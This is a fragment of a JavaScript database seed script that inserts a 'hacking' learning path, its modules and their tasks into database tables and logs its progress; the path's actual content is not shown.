	const pathResult = db.insert(schema.paths).values({
		name: hackingPath.name,
		description: hackingPath.description,
		color: hackingPath.color,
		language: hackingPath.language,
		skills: hackingPath.skills,
		startHint: hackingPath.startHint,
		difficulty: hackingPath.difficulty,
		estimatedWeeks: hackingPath.estimatedWeeks,
		schedule: hackingPath.schedule
	}).returning().get();

	console.log(`Created path: ${hackingPath.name}`);

	for (let i = 0; i < hackingPath.modules.length; i++) {
		const mod = hackingPath.modules[i];
		const moduleResult = db.insert(schema.modules).values({
			pathId: pathResult.id,
			name: mod.name,
			description: mod.description,
			orderIndex: i
		}).returning().get();

		console.log(`  Created module: ${mod.name}`);

		for (let j = 0; j < mod.tasks.length; j++) {
			const task = mod.tasks[j];
			db.insert(schema.tasks).values({
				moduleId: moduleResult.id,
				title: task.title,
				description: task.description,
				details: task.details,
				orderIndex: j,
				completed: false
			}).run();
		}
		console.log(`    Added ${mod.tasks.length} tasks`);
	}

	console.log('\nSeeding complete!');
}

seed().catch(console.error);
